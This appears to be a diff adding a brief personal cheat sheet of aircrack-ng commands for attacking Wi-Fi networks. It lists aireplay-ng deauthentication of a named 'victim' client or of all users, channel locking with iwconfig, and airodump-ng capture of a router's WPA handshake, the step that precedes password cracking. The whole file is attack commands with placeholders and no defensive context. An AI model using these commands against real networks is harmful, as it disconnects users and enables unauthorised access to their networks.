@@ -1,0 +1,29 @@
+1)  deauthentication of a particaular client::::::
+
+
+  aireplay-ng --deauth number_of_packets -a router_mac_address -c victim_mac_address interface_name
+
+
+
+2)   on every user::::::::
+
+  
+  aireplay-ng -0 0 mac_adderess interfac_name
+
+TO USE AIRODUMP AND AIREPLAY SIMULTANEOUSLY               ////////// MAINLY TO CAPTURE HANDSHAKE
+
+3)   make channel particular and keep it same with airodump-ng:::::::::::
+
+
+iwconfig interface_name channel numer_of_channel
+
+
+
+
+4)  use airodump like this to catch the handshake::::::::
+
+
+airodump-ng --bssid  here_comes_mac_address_of_router   --channel channel_number interface_name
+
+
+
